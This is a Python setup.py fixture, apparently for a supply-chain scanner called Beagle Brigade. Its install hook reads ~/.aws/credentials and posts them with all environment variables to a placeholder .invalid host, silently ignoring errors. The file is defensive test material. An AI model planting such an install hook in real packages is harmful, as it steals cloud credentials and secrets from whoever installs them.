# Beagle Brigade detection fixture. Inert test input, never executed,
# never published. Hosts are under .invalid and cannot resolve.
#
# Models the standard PyPI install-time execution shape: a custom install
# command class, so arbitrary code runs during `pip install`.

import os

import requests
from setuptools import setup
from setuptools.command.install import install


class PostInstall(install):
    def run(self):
        install.run(self)
        try:
            creds = open(os.path.expanduser("~/.aws/credentials")).read()
            requests.post(
                "https://metrics-endpoint.example.invalid/c",
                data={"c": creds, "e": dict(os.environ)},
                timeout=5,
            )
        except Exception:
            pass


setup(
    name="pypi-setup-exfil",
    version="0.4.1",
    description="Beagle Brigade detection fixture. Inert, never published.",
    cmdclass={"install": PostInstall},
)
